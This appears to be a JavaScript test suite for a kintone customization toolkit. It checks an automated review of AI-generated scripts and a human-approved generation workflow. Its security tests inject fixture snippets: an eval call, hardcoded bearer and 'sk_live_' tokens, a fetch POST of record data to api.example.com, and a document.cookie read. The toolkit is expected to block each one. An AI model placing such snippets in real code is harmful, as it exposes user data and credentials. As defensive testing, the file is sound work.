  assert(missingEv.mismatches.some(m => m.code === 'MISSING_EVENT' && m.items.includes('app.record.edit.change.amount')) && check(missingEv, 'plan-consistency').ok, '計画のイベントがコードに無い: 軽微な差として記録（計画との照合）');
  const extraEv = run(NEW_JS_GOOD.replace("['app.record.create.change.amount', 'app.record.edit.change.amount']", "['app.record.create.change.amount', 'app.record.edit.change.amount', 'app.record.detail.show']"));
  assert(extraEv.status === 'REVIEW_REQUIRED' && extraEv.mismatches.some(m => m.code === 'EXTRA_EVENT'), '計画に無いイベントの登録: 計画との不一致（確認が必要）');
  const dangerous = run(NEW_JS_GOOD.replace("    return event;", "    eval('1 + 1');\n    return event;"));
  assert(dangerous.status === 'BLOCKED' && !check(dangerous, 'security').ok && /eval/i.test(check(dangerous, 'security').message), '危険 API（eval）: BLOCKED');
  const secret = run(NEW_JS_GOOD.replace("    return event;", "    var h = { Authorization: 'Bearer abcdefghijklmnop1234567890' };\n    return event;"));
  assert(secret.status === 'BLOCKED' && !check(secret, 'security').ok, 'ハードコードされた Authorization: BLOCKED');
  const token = run(NEW_JS_GOOD.replace("    return event;", "    var API_TOKEN = 'sk_live_0123456789abcdefABCDEF';\n    return event;"));
  assert(token.status === 'BLOCKED' && !check(token, 'security').ok, 'ハードコードされた token: BLOCKED');
  const ext = run(NEW_JS_GOOD.replace("    return event;", "    fetch('https://api.example.com/notify', { method: 'POST', body: JSON.stringify({ amount: amount }) });\n    return event;"));
  assert(ext.status === 'BLOCKED' && !check(ext, 'security').ok && /外部|example\.com|POST/i.test(check(ext, 'security').message), '外部への POST: BLOCKED（既定で外部通信は禁止）');
  const cookie = run(NEW_JS_GOOD.replace("    return event;", "    var ck = document.cookie;\n    return event;"));
  assert(cookie.status === 'BLOCKED' && !check(cookie, 'security').ok, 'document.cookie: BLOCKED');
  const globals = run("var EVENTS = ['app.record.create.change.amount', 'app.record.edit.change.amount'];\nkintone.events.on(EVENTS, function (event) { event.record['amount'].error = null; return event; });");
  assert(globals.status === 'REVIEW_REQUIRED' && !check(globals, 'globals').ok, '即時関数で包まない（グローバル汚染）: 確認が必要');
  const noReturn = run(NEW_JS_GOOD.replace("    return event;\n", ""));
  assert(noReturn.status === 'REVIEW_REQUIRED' && !check(noReturn, 'return-event').ok, 'return event が無い handler: 確認が必要');
  // 実機（Scenario C）: 名前付き関数を handler に渡す形（kintone.events.on(EVENTS, checkAmount)）でも return event を本体から判定する
  const NAMED = [
    "(function () {",
    "  'use strict';",
    "  const EVENTS = ['app.record.create.change.amount', 'app.record.edit.change.amount'];",
    "  function checkAmount(event) {",
    "    const record = event.record;",
    "    record['amount'].error = Number(record['amount'].value || 0) >= 1000000 ? '100万円以上です' : null;",
    "    return event;",
    "  }",
    "  kintone.events.on(EVENTS, checkAmount);",
    "})();",
  ].join('\n');
  const named = run(NAMED);
  assert(check(named, 'return-event')?.ok && check(named, 'events')?.ok && named.status === 'OK', `名前付き関数の handler: 定義の本体で return event を判定（${check(named, 'return-event')?.message}）`);
  const namedArrow = run(NAMED.replace("  function checkAmount(event) {", "  const checkAmount = (event) => {").replace("    return event;\n  }", "    return event;\n  };"));
  assert(check(namedArrow, 'return-event')?.ok, 'アロー関数を const に入れた handler も同様');
  const namedNoReturn = run(NAMED.replace("    return event;\n", ""));
  assert(!check(namedNoReturn, 'return-event').ok, '名前付き関数に return event が無ければ指摘する');
  const dup = run(NEW_JS_GOOD.replace("})();", "  kintone.events.on('app.record.create.change.amount', function (event) { return event; });\n})();"));
  assert(!check(dup, 'duplicate-handler').ok, '同じイベントを 2 回登録: 確認が必要');
  const awaitBad = run(NEW_JS_GOOD.replace("    return event;", "    await Promise.resolve();\n    return event;"));
  assert(awaitBad.status === 'BLOCKED', 'async でない handler の await: BLOCKED（構文エラー）');
  const empty = run('   ');
  assert(empty.status === 'BLOCKED' && check(empty, 'code') && !check(empty, 'code').ok, '空のコード: BLOCKED');
  // patch の失敗
  const hy = reviewPlan(PLAN_HYBRID);
  const runP = (patch, src = SRC) => KTCodeReview.review({ generated: genPatch(patch), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: src });
  const anchorBad = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'INSERT_AFTER', anchor: '    // not in source', content: PATCH_ADDED }] });
  assert(anchorBad.status === 'BLOCKED' && !check(anchorBad, 'patch').ok && check(anchorBad, 'patch').detail?.code === 'PATCH_ANCHOR_NOT_FOUND', 'anchor が既存ソースに無い: BLOCKED（全文の書き換えに逃げない）');
  const anchorAmb = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'INSERT_AFTER', anchor: "record[", content: PATCH_ADDED }] });
  assert(anchorAmb.status === 'BLOCKED' && check(anchorAmb, 'patch').detail?.code === 'PATCH_ANCHOR_AMBIGUOUS', 'anchor が複数回現れる（"record["）: BLOCKED（一意な anchor が必要）');
  const anchorLine = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'INSERT_AFTER', anchor: "    var record = event.record;", content: PATCH_ADDED }] });
  assert(anchorLine.status === 'OK' && anchorLine.diff.added === 3 && anchorLine.diff.removed === 0, '一意な行を anchor にした INSERT_AFTER: 適用できる（OK）');
  const hashBad = runP({ baseHash: 'deadbeef', operations: PATCH_GOOD.operations });
  assert(hashBad.status === 'BLOCKED' && check(hashBad, 'patch').detail?.code === 'PATCH_BASE_MISMATCH', 'baseHash が現在の本文と違う（既存ファイルが変わった）: BLOCKED');
  const noSrc = runP(PATCH_GOOD, null);
  assert(noSrc.status === 'BLOCKED' && /JS_SOURCE_UNAVAILABLE/.test(check(noSrc, 'patch').message), '統合先の本文が無い: BLOCKED（JS_SOURCE_UNAVAILABLE）');
  const replace = runP({ baseHash: hash(FIELD_ON_OFF), operations: [{ type: 'REPLACE', anchor: "    if (record['ステータス'].value === '承認待ち') {", content: "    if (record['ステータス'].value === '承認待ち' || record['ステータス'].value === '完了') {" }] });
  assert(replace.status === 'REVIEW_REQUIRED' && check(replace, 'patch-removal') && !check(replace, 'patch-removal').ok && replace.diff.removed === 1 && replace.diff.added === 1, 'REPLACE で既存行を置き換える: 既存処理が失われないか確認（確認が必要）');
  const emptyPatch = runP({ baseHash: hash(FIELD_ON_OFF), operations: [] });
  assert(emptyPatch.status === 'BLOCKED', '操作の無い patch: BLOCKED');
  const otherStrategy = KTCodeReview.review({ generated: genNew(NEW_JS_GOOD, { strategy: 'PLUGIN_CANDIDATE' }), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan });
  assert(otherStrategy.status === 'BLOCKED' && check(otherStrategy, 'strategy') && !check(otherStrategy, 'strategy').ok, 'PLUGIN_CANDIDATE 等はコード生成の対象外: BLOCKED');
  // 既存 JS との競合（統合先以外）
  const conflict = KTCodeReview.review({ generated: genNew(), customization: NEW_JS_CUST(), plan: PLAN_NEW_JS.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: null });
  assert(conflict.status === 'REVIEW_REQUIRED' && !check(conflict, 'existing-conflict').ok && /fieldOnOff\.js/.test(check(conflict, 'existing-conflict').message), '新規 JS が既存 fieldOnOff.js と同じ amount を制御: JS_FIELD_CONFLICT（確認が必要）');
  // 実機（Phase 17 E2E C）: モバイル JS への統合（patch。追加分に handler なし）では、PC の既存 JS は競合にならず、platform は最終ファイルのイベントで判定する
  const MOBILE_LOCK_SRC = ['(function () {', "  'use strict';", "  kintone.events.on('mobile.app.record.edit.show', function (event) {", "    event.record['owner'].disabled = true;", '    return event;', '  });', '})();'].join(String.fromCharCode(10));
  const mobCust = { customizationId: 'C1', requirement: '承認待ちは金額も編集不可', strategy: 'EXTEND_EXISTING_JS', platform: ['mobile'], events: ['mobile.app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], existingFiles: [{ name: 'mobileLock.js', target: 'mobile' }] };
  const mobPatch = { baseHash: hash(MOBILE_LOCK_SRC), operations: [{ type: 'INSERT_AFTER', anchor: "    event.record['owner'].disabled = true;", content: ["    if (event.record['ステータス'].value === '承認待ち') {", "      event.record['amount'].disabled = true;", '    }'].join(String.fromCharCode(10)) }] };
  const mobRv = KTCodeReview.review({ generated: { strategy: 'EXTEND_EXISTING_JS', targetFile: 'mobileLock.js', summary: 'm', code: mobPatch.operations[0].content, patch: mobPatch, events: ['mobile.app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [] }, customization: mobCust, plan: PLAN_HYBRID.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: { name: 'mobileLock.js', target: 'mobile', text: MOBILE_LOCK_SRC } });
  assert(mobRv.status === 'OK' && check(mobRv, 'existing-conflict').ok && check(mobRv, 'platform').ok, `モバイル JS への統合: PC の fieldOnOff.js は競合にならず、platform は最終ファイルの mobile イベントで整合（${(mobRv.checks || []).filter(c => !c.ok).map(c => c.name).join(',') || 'すべて ✓'}）`);
  // platform
  const mobilePlan = KTCodeReview.review({ generated: genNew(), customization: { ...NEW_JS_CUST(), platform: ['desktop', 'mobile'] }, plan: PLAN_NEW_JS.plan, data: INPUTS_PLAIN.data, scan: INPUTS_PLAIN.scan });
  assert(!check(mobilePlan, 'platform').ok, '計画はモバイルも対象なのに mobile.* のイベントが無い: 確認が必要');
}

// =========================================================
console.log('\n--- §53. AI Workspace: Hybrid の計画 → カード → コード生成 → Code Review → Diff / コピー ---');
const HEALTH = { ok: true, supportedContractVersions: ['2.0', '2.1'], entitlements: [{ product: 'toolkit', features: ['assistant-qa', 'change-planner', 'customization-generator'] }], registry: { toolkit: { 'assistant-qa': { implemented: true, promptVersions: ['1'] }, 'change-planner': { implemented: true, promptVersions: ['1'] }, 'customization-generator': { implemented: true, promptVersions: ['1'] } } }, usage: { monthlyLimit: 20, usedThisMonth: 1 } };
const HEALTH_NO_GEN = { ...HEALTH, entitlements: [{ product: 'toolkit', features: ['assistant-qa', 'change-planner'] }] };
const makeStorage = () => { const m = new Map(); return { getItem: (k) => (m.has(k) ? m.get(k) : null), setItem: (k, v) => m.set(k, String(v)), removeItem: (k) => m.delete(k) }; };
const answerFor = (ctx, text) => ({ ok: true, contractVersion: '2.1', meta: { requestId: 'qa-1', usage: { usedThisMonth: 2, monthlyLimit: 20 }, normalization: { warnings: [] } }, answer: text, facts: [], analysis: [], recommendations: [], unknowns: [] });
function mount({ inputs = INPUTS, planResponse = PLAN_HYBRID, generatedFor = null, health = HEALTH, loadJsSource = undefined, rescanJs = undefined, generateError = null } = {}) {
  const storage = makeStorage();
  const settings = KTAiClient.createSettingsStore({ storage, host: 't.cybozu.com' });
  settings.setConsent(true);
  const calls = { ask: [], plan: [], generate: [], health: 0 };
  const client = {
    async getHealth() { calls.health++; return health; },
    async ask({ ctx, requestId, signal }) {
      calls.ask.push({ ctx, requestId, signal });
      const text = ctx.planContext ? 'C1 は、承認後の金額ロックがフィールドのアクセス権では表現できないため JavaScript になっています。' : 'このフィールドは金額です。';
      const v = KTAiClient.validateAnswer(answerFor(ctx, text), ctx);
      return { ...v.normalized, requestId: v.normalized.requestId || requestId, clientWarnings: v.warnings };
    },
    async plan({ ctx, requestId, signal }) {
      calls.plan.push({ ctx, requestId, signal });
      const resp = typeof planResponse === 'function' ? planResponse(ctx) : planResponse;
      const v = KTAiClient.validatePlan(resp, ctx);
      return { ...v.normalized, requestId, clientWarnings: v.warnings };
    },
    async generate({ ctx, requestId, signal }) {
      calls.generate.push({ ctx, requestId, signal });
      if (generateError) throw generateError;
      const g = generatedFor ? generatedFor(ctx) : (ctx.customization.strategy === 'EXTEND_EXISTING_JS' ? genPatch({ ...PATCH_GOOD, baseHash: ctx.existingFile?.hash || PATCH_GOOD.baseHash }) : genNew());
      const v = KTAiClient.validateGenerated(genResponse(ctx, g), ctx);
      if (!v.ok) throw new KTAiClient.AiClientError({ code: v.errors[0].code, message: v.errors[0].message, requestId });
      return { ...v.normalized, requestId, clientWarnings: v.warnings };
    },
  };
  const session = { status() { return { connected: true, apiBase: 'https://gw.test', refreshExpiresAt: '2099-01-01T00:00:00Z', scope: { product: 'toolkit', feature: 'assistant-qa,change-planner,customization-generator', domain: 't.cybozu.com' } }; }, async migrateLegacy() { return false; }, async refresh() { return {}; }, async disconnect() { return { revoked: true }; }, client };
  const flow = { start: async () => ({}), cancel() { }, reopen: () => false, state: () => ({ phase: 'idle' }), isRunning: () => false };
  const host = makeFakeHost();
  const copies = [], downloads = [];
  const mock = makeKintoneMock(inputs.data);
  const panel = mountAiWorkspace(host, {
    getInputs: () => inputs, copyText: async (t) => { copies.push(t); return true; }, downloadText: (name, text) => downloads.push({ name, text }), colors: { border: '#ccc', bg: '#fff' },
    settings, session, hostname: 't.cybozu.com', connectFlow: flow,
    executor: { api: mock.api, appId: '310' },
    ...(loadJsSource ? { loadJsSource } : {}), ...(rescanJs ? { rescanJs } : {}),
  });
  const $ = (id) => host.querySelector(`#${id}`);
  return { host, panel, $, calls, copies, downloads, mock, conv: () => panel.conversation(), chat: () => $('kt-ai-chat').innerHTML, msgs: () => panel.conversation().state.messages, types: () => panel.conversation().state.messages.map(m => m.type) };
}
const clickChat = (m, act, extra = {}) => m.$('kt-ai-chat').dispatch({ type: 'click', target: { dataset: { act, ...extra } } });
/** Phase 17: 実装仕様の確定（Human Approval の SoT は仕様カードの［この仕様で確定］）。仕様が無い（JS のない）計画では何もしない */
const confirmSpec = async (m) => { const v = m.conv().activePlan(); if (v?.spec) await clickChat(m, 'confirm-spec', { plan: v.planId, version: String(v.version) }); };
const writes = (m) => m.mock.calls.filter(c => !c.startsWith('GET'));
{
  const m = mount();
  await ticks();
  const r = await m.panel.send(GOAL_HYBRID);
  assert(r && r.ok && r.intent === KTAiConversation.INTENT.PLAN && m.calls.plan.length === 1, 'Hybrid の goal → PLAN（Planner を 1 回呼ぶ）');
  const v = m.conv().activePlan();
  assert(v && v.plan.solution === 'HYBRID' && v.plan.customizations.length === 1 && v.review && v.review.hybrid.solution === 'HYBRID', '計画の版: solution HYBRID・customizations 1・Toolkit Review に hybrid');
  const html = m.chat();
  assert(/標準設定/.test(html) && /JavaScript カスタマイズ/.test(html) && /標準設定 ＋ JavaScript/.test(html), '計画カード: 標準設定 / JavaScript カスタマイズ の 2 段と solution 表示');
  assert(/kt-ai-customization-card/.test(html) && /✎ 既存 JS を変更/.test(html) && /fieldOnOff\.js/.test(html) && /標準設定で不足する理由/.test(html) && /app\.record\.edit\.show/.test(html) && /amount（CONTROL）/.test(html), 'Customization Card: ✎ 既存 JS を変更（fieldOnOff.js）・イベント・フィールド（access）・不足する理由');
  assert(/data-act="generate" data-cid="C1"/.test(html) && /コードを作る/.test(html), 'Customization Card に［コードを作る］（data-cid）');
  assert(/JS コード生成可能/.test(html) && /1 \/ 1 件/.test(html), 'Review カード: JavaScript の行（生成可能 1 / 1）');
  const planPane = m.$('kt-ai-plan-result').innerHTML;
  assert(/kt-ai-review-hybrid/.test(planPane) && /実装計画（標準設定 ＋ JavaScript）/.test(planPane) && /コード生成可能: 1 件/.test(planPane) && /data-act="generate" data-cid="C1"/.test(planPane), '実行前レビュー: Hybrid Review ブロック（標準設定 / JavaScript / 全体）と JS の step に［コードを作る］');
  assert(/登録済み JS/.test(m.$('kt-ai-header').innerHTML) && /fieldOnOff\.js/.test(m.$('kt-ai-header').innerHTML), 'ヘッダー詳細: 登録済み JS（既存カスタマイズ設定）');
  // 「これで進めて」はコードを作らない
  const pv = await m.panel.send('これで進めて');
  assert(pv.intent === KTAiConversation.INTENT.REQUEST_PREVIEW && m.calls.generate.length === 0 && /JS カスタマイズ 1 件は Executor では反映しません/.test(m.chat()), '「これで進めて」: REQUEST_PREVIEW。コードは生成しない・JS は Executor で反映しない旨');
  // 説明（EXPLAIN_CUSTOMIZATION）
  const ex = await m.panel.send('C1 はなぜ JavaScript が必要？');
  assert(ex.intent === KTAiConversation.INTENT.EXPLAIN_CUSTOMIZATION && m.calls.ask.length === 1 && m.calls.ask[0].ctx.planContext?.kind === 'EXPLAIN_PLAN' && /JavaScript カスタマイズの説明/.test(m.chat()), 'EXPLAIN_CUSTOMIZATION: planContext（EXPLAIN_PLAN）で説明だけ。計画は変えない');
  assert(m.conv().activePlan() === v && m.calls.plan.length === 1 && m.calls.generate.length === 0, '説明では Planner / Generator を呼ばない');
  // Phase 17: 仕様の確定前はコードを作らない（spec-required）。チャットの「それでいい」でも確定しない。確定は仕様カードの［この仕様で確定］だけ
  assert(v.spec && v.spec.status === 'DRAFT' && m.types().includes('SPEC') && /実装仕様 v1/.test(m.chat()) && /data-act="confirm-spec"/.test(m.chat()) && /data-act="revise-spec"/.test(m.chat()), '計画に JS があれば実装仕様 v1（DRAFT）のカード: ［仕様を修正］［この仕様で確定］');
  const g0 = await m.panel.send('コードを作って');
  assert(g0.ok === false && m.calls.generate.length === 0 && m.msgs().some(x => x.data?.kind === 'spec-required'), '仕様の確定前の「コードを作って」: Generator を呼ばず、確定を案内');
  const c0 = await m.panel.send('それでいい');
  assert(c0.intent === KTAiConversation.INTENT.CONFIRM_SPEC && v.spec.status === 'DRAFT' && /この仕様で確定］ボタン/.test(m.chat()), '「それでいい」は CONFIRM_SPEC（案内だけ。仕様は DRAFT のまま）');
  await confirmSpec(m);
  assert(v.spec.status === 'CONFIRMED' && v.spec.customizeRevision === '12' && m.msgs().some(x => x.data?.kind === 'spec-confirmed') && /確定済み/.test(m.chat()) && /JavaScript を生成（C1）/.test(m.chat()), '［この仕様で確定］→ CONFIRMED・動作テスト環境の customize revision（12）を記録・［JavaScript を生成（C1）］');
  // コード生成
  const g = await m.panel.send('コードを作って');
  assert(g && g.ok && g.intent === KTAiConversation.INTENT.GENERATE_CODE && m.calls.generate.length === 1, '「コードを作って」→ GENERATE_CODE → Generator を 1 回呼ぶ');
  const gctx = m.calls.generate[0].ctx;
  assert(gctx.contextVersion === 'customization-1' && gctx.customization.customizationId === 'C1' && gctx.existingFile?.name === 'fieldOnOff.js' && gctx.existingFile.source === FIELD_ON_OFF && gctx.facts === undefined, 'Generator Context: C1 ＋ 統合先の本文（解析結果から）。アプリ全体の facts なし');
  const entry = m.panel.generated('C1');
  assert(entry && entry.generated.strategy === 'EXTEND_EXISTING_JS' && entry.review.status === 'OK' && entry.existingSource?.text === FIELD_ON_OFF, '生成結果を版に保持: Toolkit Code Review OK');
  assert(m.types().includes('CODE') && /JavaScript を生成しました/.test(m.chat()) && /Toolkit Code Review/.test(m.chat()) && /✓ 検査を通過/.test(m.chat()) && /✎ 既存 JS を変更: <b>fieldOnOff\.js<\/b>/.test(m.chat()), 'コードカード: 対象（✎ 既存 JS を変更）・Toolkit Code Review ✓');
  assert(/data-act="open-code" data-cid="C1" data-view="code"/.test(m.chat()) && /data-act="open-code" data-cid="C1" data-view="diff"/.test(m.chat()) && /data-act="copy-code"/.test(m.chat()) && /data-act="copy-diff"/.test(m.chat()), 'コードカードの操作: コードを見る / Diffを見る / コピー / Diffをコピー');
  assert(/＋3 行 \/ −0 行/.test(m.chat()) && /元のコードは保持/.test(m.chat()), 'Diff の要約: 3 行追加・削除 0（元のコードは保持）');
  assert(/data-act="open-js-register"/.test(m.chat()) && /登録は［動作テスト環境へ登録］→ 確認画面/.test(m.chat()) && /運用環境には反映しません/.test(m.chat()), 'コードカード: ［動作テスト環境へ登録］は確認画面を経る旨（Phase 17）・運用環境には反映しない');
  assert(writes(m).length === 0, 'コード生成で kintone への書き込みは 0 件');
  // コードを見る / Diff
  await clickChat(m, 'open-code', { cid: 'C1', view: 'code' });
  assert(m.panel.drawerState().open && m.panel.drawerState().pane === 'code' && m.$('kt-ai-code-view').textContent === entry.review.finalCode && m.$('kt-ai-code-view').style.display === '' && m.$('kt-ai-diff-view').style.display === 'none', '［コードを見る］→ コードペインに最終コード');
  assert(/✎ 既存 JS を変更/.test(m.$('kt-ai-code-head').innerHTML) && /Patch/.test(m.$('kt-ai-code-review').innerHTML) && /Security/.test(m.$('kt-ai-code-review').innerHTML), 'コードペイン: 見出しと Code Review の一覧');
  await clickChat(m, 'open-code', { cid: 'C1', view: 'diff' });
  assert(m.$('kt-ai-diff-view').style.display === '' && /^\+\s*if \(record\['ステータス'\]\.value === '完了'\)/m.test(m.$('kt-ai-diff-view').textContent) && / {0,}kintone\.events\.on/.test(m.$('kt-ai-diff-view').textContent), '［Diffを見る］→ Before / After（追加行は +・既存行は保持）');
  // コピー
  await clickChat(m, 'copy-code', { cid: 'C1' });
  assert(m.copies.length === 1 && m.copies[0] === entry.review.finalCode && m.copies[0].includes("value === '完了'") && m.copies[0].startsWith('(function () {'), '［コピー］: 最終コード（既存 ＋ 追加）');
  await clickChat(m, 'copy-diff', { cid: 'C1' });
  assert(m.copies.length === 2 && /^\+/m.test(m.copies[1]), '［Diffをコピー］');
  await clickChat(m, 'copy-cplan', { cid: 'C1' });
  const cplan = JSON.parse(m.copies[2]);
  assert(cplan.customization.customizationId === 'C1' && cplan.generated.strategy === 'EXTEND_EXISTING_JS' && cplan.codeReview.status === 'OK' && cplan.provenance.planId === v.planId && cplan.provenance.customizationId === 'C1' && cplan.provenance.requestId, '［Plan JSON］: Customization Plan ＋ 生成要約 ＋ Code Review ＋ 出所（provenance）');
  // コードペインのボタン
  await m.$('kt-ai-pane-code').dispatch({ type: 'click', target: { id: 'kt-ai-code-download' } });
  assert(m.downloads.length === 1 && m.downloads[0].name === 'fieldOnOff.js' && m.downloads[0].text === entry.review.finalCode, 'コードペイン: ファイルとして保存（登録はしない）');
  await m.$('kt-ai-pane-code').dispatch({ type: 'click', target: { id: 'kt-ai-code-copy' } });
  assert(m.copies.length === 4 && m.copies[3] === entry.review.finalCode, 'コードペイン: コードをコピー');
  // Q&A は影響なし
  const qa = await m.panel.send('このフィールドは何に使ってる？');
  assert(qa.intent === KTAiConversation.INTENT.ASK && m.calls.ask.length === 2 && !m.calls.ask[1].ctx.planContext, 'Q&A は影響なし（ASK → assistant-qa。planContext なし）');
  // Preview Executor は JS を反映しない
  m.panel.decide('P1', 'approve'); m.panel.decide('P2', 'approve');
  const rd = m.panel.conversation() && (await m.panel.send('これで進めて'));
  const ready = m.msgs().filter(x => x.data?.kind === 'preview-ready').pop();
  assert(rd.intent === KTAiConversation.INTENT.REQUEST_PREVIEW && ready.data.readiness.executable === 1 && ready.data.readiness.unsupported === 1 && ready.data.readiness.customizations === 1, '承認後の readiness: 実行可 1（P1）・未対応 1（JS の P2）・JS 1');
  await m.$('kt-ai-plan-result').dispatch({ type: 'click', target: { id: 'kt-ai-exec-start' } });
  await ticks(8);
  assert(m.panel.executorState().stage === 'confirm', 'Executor: prepare → 最終確認');
  await m.$('kt-ai-plan-result').dispatch({ type: 'click', target: { id: 'kt-ai-exec-go' } });
  await ticks(12);
  const ex2 = m.panel.executorState().execution;
  assert(ex2 && ex2.status === 'DONE' && ex2.steps.find(s => s.stepId === 'P1')?.status === 'VERIFIED' && ex2.steps.find(s => s.stepId === 'P2')?.status === 'UNSUPPORTED', 'Preview Executor: P1（一覧）は VERIFIED・JS の P2 は UNSUPPORTED（反映しない）');
  assert(writes(m).length > 0 && !writes(m).some(c => /customize/.test(c)), `Executor の書き込みに customize.json（JS 登録）は無い（${writes(m).length} 件）`);
  // 版が変わっても生成結果は版に紐づく
  assert(m.panel.generated('C1') === entry, '生成結果は計画の版に保持されたまま');
}

// =========================================================
console.log('\n--- §53-2. カスタマイズの修正 / 複数カスタマイズの選択 / 生成不可 / BLOCKED なコード ---');
{
  const C2 = cust({ customizationId: 'C2', requirement: '承認済みなら担当者も編集できなくする', fields: [{ code: 'owner', access: 'CONTROL' }] });
  const twoC = planOf({ steps: [STD_STEP(), JS_STEP(), mkStep('P3', 'CUSTOMIZATION_REQUIRED', 'JS', 'fieldOnOff.js', { customizationId: 'C2' }, { title: '承認済みなら担当者も編集不可（JavaScript）', solution: 'CUSTOMIZATION' })], customizations: [cust(), C2], solution: 'HYBRID' });
  const m = mount({ planResponse: (ctx) => (ctx.revision ? planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [cust({ platform: ['desktop', 'mobile'], events: ['app.record.edit.show', 'mobile.app.record.edit.show'] })], solution: 'HYBRID', requestId: 'pl-h2' }) : twoC) });
  await ticks();
  await m.panel.send(GOAL_HYBRID);
  await confirmSpec(m);
  const g0 = await m.panel.send('コードを作って');
  assert(g0.intent === KTAiConversation.INTENT.GENERATE_CODE && m.calls.generate.length === 0 && m.msgs().some(x => x.data?.kind === 'customization-choices' && x.data.choices.length === 2), '複数の生成可能なカスタマイズ: どれか聞く（勝手に生成しない）');
  assert(/data-act="generate" data-cid="C2"/.test(m.chat()), '選択肢のボタン（data-cid）');
  await clickChat(m, 'generate', { cid: 'C2' });
  assert(m.calls.generate.length === 1 && m.calls.generate[0].ctx.customization.customizationId === 'C2' && m.panel.generated('C2') && !m.panel.generated('C1'), 'ボタンから C2 だけを生成（会話の GENERATE_CODE を通る）');
  const c2 = m.panel.generated('C2');
  assert(c2.review.status === 'REVIEW_REQUIRED' && c2.review.mismatches.some(x => x.code === 'MISSING_FIELD' && x.items.includes('owner')) && c2.review.mismatches.some(x => x.code === 'EXTRA_FIELD_WRITE' && x.items.includes('amount')), 'C2 なのに amount を制御する patch: 計画との不一致（owner が無い・amount は計画外）→ 要確認');
  assert(/△ 要確認/.test(m.chat()) && /確認が必要な点があります/.test(m.chat()), 'コードカード: △ 要確認');
  // 計画の修正（カスタマイズの対象をモバイルにも）→ v2。生成結果は v1 に残り v2 には無い
  const rv = await m.panel.send('金額のロックはモバイルでも動くようにして');
  assert(rv.intent === KTAiConversation.INTENT.REVISE_PLAN && m.calls.plan.length === 2 && m.calls.plan[1].ctx.revision && m.conv().activePlan().version === 2, 'カスタマイズの修正 → REVISE_PLAN → v2');
  const v2 = m.conv().activePlan();
  assert(v2.plan.customizations[0].platform.join() === 'desktop,mobile' && v2.review.steps.find(r => r.solution === 'CUSTOMIZATION')?.codeGeneration?.supported === true && !m.panel.generated('C1', v2) && !m.panel.generated('C2', v2), 'v2: platform desktop / mobile。v1 の生成コードは v2 に引き継がない（再生成が必要）');
  assert(m.calls.plan[1].ctx.revision.previousPlan && JSON.stringify(m.calls.plan[1].ctx.revision.previousPlan).includes('C1'), 'revision の previousPlan に customization（C1）が含まれる');
}
{
  // 生成不可（PC / モバイル未定）
  const m = mount({ planResponse: planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [cust({ platform: [] })], solution: 'HYBRID' }) });
  await ticks();
  await m.panel.send(GOAL_HYBRID);
  await confirmSpec(m);
  assert(/生成不可/.test(m.chat()) && /PC \/ モバイルのどちらが対象か決まっていません/.test(m.$('kt-ai-plan-result').innerHTML), 'PC / モバイル未定: カードは「生成不可」・Review に確認事項');
  assert(/JS 1（生成可 0・要確認 1）/.test(m.chat()), '計画カードの JS 行: 生成可 0・要確認 1（JS の確認事項は Executor の △ とは別に数える）');
  assert(/JavaScript カスタマイズに確認が必要な点があります/.test(m.chat()) && !/問題は見つかりませんでした/.test(m.chat()), 'Review の案内: JS の要確認を文言に反映（「問題は見つかりませんでした」にしない。実機で確認）');
  const g = await m.panel.send('コードを作って');
  assert(g.ok === false && m.calls.generate.length === 0 && m.msgs().some(x => x.data?.kind === 'generate-blocked') && /まだコードを生成できません/.test(m.chat()), '生成不可の step は Generator を呼ばない（計画の修正か確認事項への回答を促す）');
}
{
  // BLOCKED なコード（未知フィールド）→ 採用不可
  const m = mount({ inputs: INPUTS_PLAIN, planResponse: PLAN_NEW_JS, generatedFor: () => genNew(NEW_JS_GOOD.replace("record['amount'].value", "record['amount_total'].value")) });
  await ticks();
  await m.panel.send('金額が100万円以上なら警告メッセージを表示したい');
  assert(/＋ 新規 JS/.test(m.chat()) && m.conv().activePlan().plan.solution === 'CUSTOMIZATION', '新規 JS の計画: ＋ 新規 JS・solution CUSTOMIZATION');
  await confirmSpec(m);
  const g = await m.panel.send('JS を書いて');
  assert(g.ok && m.calls.generate.length === 1 && m.panel.generated('C1').review.status === 'BLOCKED', 'Generator の応答に未知フィールド → Toolkit Code Review BLOCKED');
  assert(/× 採用不可/.test(m.chat()) && /採用できない問題/.test(m.chat()) && /GENERATED_JS_UNKNOWN_FIELD/.test(m.chat()) && /計画を修正して再生成/.test(m.chat()), 'コードカード: × 採用不可・理由（GENERATED_JS_UNKNOWN_FIELD）・再生成の案内');
  await clickChat(m, 'copy-code', { cid: 'C1' });
  assert(m.copies.length === 1, 'BLOCKED でもコードの確認（コピー）はできる（登録はしない）');
}

// =========================================================
console.log('\n--- §53-3. JS_SOURCE_UNAVAILABLE → 再スキャン / 契約に無い / Gateway エラー / キャンセル ---');
{
  let available = false;
  const m = mount({ inputs: INPUTS_CACHED, loadJsSource: async ({ name, fileKey }) => (available && name === 'fieldOnOff.js' && fileKey === '20261003000000EEEE' ? FIELD_ON_OFF : null), rescanJs: async () => { available = true; return { ok: true, fromCache: false }; } });
  await ticks();
  await m.panel.send(GOAL_HYBRID);
  const v = m.conv().activePlan();
  assert(v.review.steps.find(r => r.solution === 'CUSTOMIZATION').codeGeneration.sourceAvailable === false && v.review.steps.find(r => r.solution === 'CUSTOMIZATION').codeGeneration.supported === true, 'キャッシュ payload: 本文なし（生成は試みる）');
  await confirmSpec(m);
  const g = await m.panel.send('コードを作って');
  assert(g.ok === false && m.calls.generate.length === 0 && m.msgs().some(x => x.data?.kind === 'source-unavailable' && x.data.file?.name === 'fieldOnOff.js') && /JS_SOURCE_UNAVAILABLE/.test(m.chat()), '本文を取得できない: Generator を呼ばず JS_SOURCE_UNAVAILABLE（既存ファイルへの自動生成はしない）');
